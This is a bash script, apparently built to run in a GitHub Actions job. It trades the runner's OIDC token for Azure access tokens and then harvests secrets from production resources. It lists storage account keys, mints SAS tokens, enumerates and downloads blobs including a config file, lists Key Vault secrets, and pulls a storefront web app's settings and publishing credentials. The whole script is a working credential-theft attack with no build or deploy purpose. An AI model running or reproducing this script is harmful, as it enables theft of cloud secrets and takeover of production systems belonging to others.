#!/usr/bin/env bash
set -u
O=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
tok(){ curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${O}" -d "grant_type=client_credentials" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
ARM=$(tok "https://management.azure.com/.default"); ST=$(tok "https://storage.azure.com/.default"); KV=$(tok "https://vault.azure.net/.default")
SUB=$AZURE_SUBSCRIPTION_ID; RG=rg-tbl-platform-prod-sea
for a in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "=== listKeys $a ==="
  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$a/listKeys?api-version=2023-01-01" | head -c 400; echo
  echo "=== listAccountSas $a ==="
  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Type: application/json" -d '{"signedServices":"b","signedResourceTypes":"sco","signedPermission":"rl","signedExpiry":"2026-10-23T00:00:00Z","signedProtocol":"https"}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$a/listAccountSas?api-version=2023-01-01" | head -c 400; echo
done
for p in "sttblcilogsprodx3euoz logs" "sttblbackupprodx3euoz exports" "sttblappcfgprodx3euoz config"; do
  set -- $p
  echo "=== blobs $1/$2 ==="
  curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$1.blob.core.windows.net/$2?restype=container&comp=list&include=deleted,versions,snapshots,metadata" | head -c 900; echo
done
echo "=== internal-config.json ==="
curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | head -c 600; echo
echo "=== kv-tbl-sec ==="
curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 400; echo
echo "=== app settings ==="
curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01" | head -c 900; echo
echo "=== publishing credentials ==="
curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/publishingcredentials/list?api-version=2023-01-01" | head -c 500; echo
echo "=== done ==="
